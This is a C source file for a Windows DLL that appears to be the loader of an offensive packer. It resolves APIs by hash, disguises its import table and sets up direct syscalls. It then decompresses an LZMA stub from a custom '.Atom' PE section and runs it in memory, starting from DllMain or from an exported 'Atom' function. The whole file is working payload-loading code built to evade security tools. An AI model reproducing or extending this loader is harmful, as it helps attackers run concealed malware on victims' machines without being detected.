#include <Windows.h>
//#include <strsafe.h>
//#include <stdio.h>

#include "Utils.h"
#include "IatCamouflage.h"
#include "easylzma.h"
#include "Debug.h"

#pragma comment (lib, "easylzma_s.lib")
#pragma comment (lib, "Syscalls.lib")


#pragma comment(linker,"/ENTRY:DllMain")
#pragma warning( disable : 4996)


//function proto-type:
BOOL ActualMain();

//_DllMainCRTStartup
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved){
    
    switch (dwReason){

        case DLL_PROCESS_ATTACH: {
#ifdef DEBUG
            if (GetConsole() == NULL) {
                MessageBoxA(NULL, "Failed To Create A Console To Write Debug Events To", ":(", MB_OK);
            }
#endif
            BOOL    _Atom = FALSE;
            int     _argc = 0;
            LPWSTR* _argv = CommandLineToArgvW(GetCommandLineW(), &_argc);
            for (int i = 0; i < _argc; i++){
                // hash this here
                if (HASHW(_argv[i]) == Atom_StrHashed){
                    _Atom = TRUE;
                }
            }


            if(!_Atom){
#ifdef DEBUG
                PRINT(L"[i] Calling ActualMain from - DllMain \n");
#endif // DEBUG
                CreateThread(NULL, NULL, ActualMain, NULL, NULL, NULL);
            }
            
        }

        case DLL_PROCESS_DETACH: {

            break;
        }
    }

    return TRUE;
}


__declspec(dllexport) VOID Atom () {
#ifdef DEBUG
    PRINT(L"[i] Calling ActualMain from - Atom \n");
#endif // DEBUG

    if(!ActualMain()){
#ifdef DEBUG
        MessageBoxA(NULL, " ActualMain - Atom ", "FAILED ", MB_OK);
#endif // DEBUG
        return;
    }

    WaitForSingleObject(CreateEvent(0, 0, 0, 0), INFINITE);
}




BOOL ActualMain() {

    HMODULE hModule = NULL;
    fnGetModuleHandleExA pGetModuleHandleExA = (fnGetModuleHandleExA)GetProcAddressH(GetModuleHandleH(KERNEL32DLL), GetModuleHandleExA_StrHashed);
    if (pGetModuleHandleExA == NULL){
        return FALSE;
    }
    if (!pGetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)&ActualMain, &hModule) || hModule == NULL) {
        return FALSE;
    }

    CamouflageImports(0xFF);

    unsigned int	iError = ELZMA_E_OK;
    unsigned char* _OutputUnpackedData = NULL;
    size_t          _OutputUnpackedSize = NULL;

    CHAR* pBaseAddress = (CHAR*)hModule;
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddress;
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBaseAddress + pImgDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pImgSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdr) + sizeof(IMAGE_NT_HEADERS));
    PVOID  pData = NULL;
    SIZE_T sSize = NULL;
    for (size_t i = 0; i <= pImgNtHdr->FileHeader.NumberOfSections; i++) {
        if (ATOM_StrHashed == HASH(pImgSectionHdr->Name)) {
            pData = (PVOID)((ULONG_PTR)pBaseAddress + pImgSectionHdr->VirtualAddress);
            sSize = pImgSectionHdr->SizeOfRawData;
            break;
        }
        pImgSectionHdr = (PIMAGE_SECTION_HEADER)((PBYTE)pImgSectionHdr + (DWORD)sizeof(IMAGE_SECTION_HEADER));
    }

    if (pData == NULL || sSize == NULL) {
#ifdef DEBUG
        PRINT(L"[!] NO .Atom Section Found - Build it Plz (main.c:)\n");
#endif // DEBUG
        return FALSE;
    }


    if (!InitializeDirectNtCalls()) {
#ifdef DEBUG
        PRINT(L"[!] Failed To Initialize The Direct Syscalls Struct (main.c:)\n");
#endif // DEBUG
        return FALSE;
    }

    if ((iError = simpleDecompress(ELZMA_lzma, pData, sSize, &_OutputUnpackedData, &_OutputUnpackedSize)) != ELZMA_E_OK) {
#ifdef DEBUG
        PRINT(L"[!] Failed To Decompress The Stub (main.c:)\n");
#endif // DEBUG
        return FALSE;
    }

    UnpackAndRunEp(_OutputUnpackedData, _OutputUnpackedSize, TRUE);

    return TRUE;
}




#ifdef DEBUG

HANDLE hConsole = NULL;

HANDLE GetConsole() {

    if (hConsole != NULL) {
        return hConsole;
    }

    if (!FreeConsole()) {
        return NULL;
    }

    if (!AllocConsole()) {
        return NULL;
    }

    if ((hConsole = GetStdHandle(STD_OUTPUT_HANDLE)) == NULL) {
        return NULL;
    }

    return hConsole;
}

#endif // DEBUG